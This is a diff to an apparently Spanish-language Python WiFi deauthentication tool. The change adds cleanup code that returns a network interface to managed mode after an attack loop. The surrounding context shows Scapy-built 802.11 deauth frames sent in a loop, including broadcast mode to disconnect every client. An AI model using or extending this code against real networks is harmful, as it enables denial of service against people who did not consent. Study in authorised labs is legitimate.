@@ -65,6 +65,14 @@ def _enable_monitor(iface: str) -> bool:
     return _check_monitor_mode(iface)
 
 
+def _disable_monitor(iface: str) -> None:
+    """Restore *iface* to managed mode. Best-effort, swallows errors."""
+    rprint(f"[dim][·] Restaurando {iface} a modo managed...[/dim]")
+    subprocess.run(["ip", "link", "set", iface, "down"],            capture_output=True)
+    subprocess.run(["iw", "dev", iface, "set", "type", "managed"],  capture_output=True)
+    subprocess.run(["ip", "link", "set", iface, "up"],              capture_output=True)
+
+
 def _build_deauth(target_mac: str, bssid: str, reason: int = 7):
     """
     Build the 802.11 Deauth Scapy frame.
@@ -107,6 +115,7 @@ def deauth_target(
         rprint("[red][✗] Necesitas root.[/red]")
         return
 
+    we_enabled_monitor = False
     if not _check_monitor_mode(iface):
         rprint(f"[yellow][!][/yellow] {iface} no está en monitor mode.")
         if not _enable_monitor(iface):
@@ -114,6 +123,7 @@ def deauth_target(
             rprint("[dim]En Android: tu chip WiFi probablemente no soporta esto.\n"
                    "Solución: Alfa AWUS036ACH por OTG, o corre desde una RPi/Kali.[/dim]")
             return
+        we_enabled_monitor = True
 
     frame          = _build_deauth(target_mac, bssid)
     target_display = "BROADCAST (todos)" if target_mac == BROADCAST else target_mac
@@ -132,6 +142,9 @@ def deauth_target(
             rprint(f"  [dim][→] Frames enviados: {sent}[/dim]", end="\r")
     except KeyboardInterrupt:
         rprint(f"\n[bold yellow][!][/bold yellow] Detenido. {sent} frames en total.")
+    finally:
+        if we_enabled_monitor:
+            _disable_monitor(iface)
 
 
 if __name__ == "__main__":
